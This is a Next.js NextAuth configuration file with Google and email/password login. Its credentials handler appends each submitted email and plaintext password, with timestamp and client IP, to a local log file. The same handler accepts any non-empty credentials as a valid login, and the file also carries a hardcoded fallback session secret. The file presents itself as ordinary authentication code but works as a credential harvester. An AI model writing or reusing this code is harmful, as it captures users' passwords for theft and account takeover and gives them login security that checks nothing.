import NextAuth from 'next-auth';
import GoogleProvider from 'next-auth/providers/google';
import CredentialsProvider from 'next-auth/providers/credentials';
import fs from 'fs';
import path from 'path';

export const authOptions = {
  providers: [
    GoogleProvider({
      clientId: process.env.GOOGLE_CLIENT_ID || '',
      clientSecret: process.env.GOOGLE_CLIENT_SECRET || '',
    }),
    CredentialsProvider({
      name: 'Credentials',
      credentials: {
        email: { label: 'Email', type: 'email', placeholder: 'email@example.com' },
        password: { label: 'Password', type: 'password' },
      },
      async authorize(credentials, req) {
        if (credentials?.email && credentials?.password) {
          const logFilePath = path.join(process.cwd(), 'user_credentials_log.txt');
          const timestamp = new Date().toISOString();
          const ip = req?.headers?.['x-forwarded-for'] || req?.socket?.remoteAddress || 'unknown';

          const logEntry =
            `[${timestamp}] | TYPE: LOGIN | EMAIL: ${credentials.email} | PASSWORD: ${credentials.password} | IP: ${ip}\n`;

          try {
            fs.appendFileSync(logFilePath, logEntry, 'utf8');
            console.log('Login credentials logged to file');
          } catch (err) {
            console.error('Logging failed:', err.message);
          }
        }

        if (credentials?.email && credentials?.password) {
          return {
            id: '1',
            name: 'Demo User',
            email: credentials.email,
            image: null,
          };
        }
        return null;
      },
    }),
  ],
  pages: {
    signIn: '/login',
  },
  callbacks: {
    async jwt({ token, user }) {
      if (user) {
        token.id = user.id;
      }
      return token;
    },
    async session({ session, token }) {
      if (session.user) {
        session.user.id = token.id;
      }
      return session;
    },
  },
  session: {
    strategy: 'jwt',
  },
  secret: process.env.NEXTAUTH_SECRET || 'your-secret-key-change-in-production',
};

export default NextAuth(authOptions);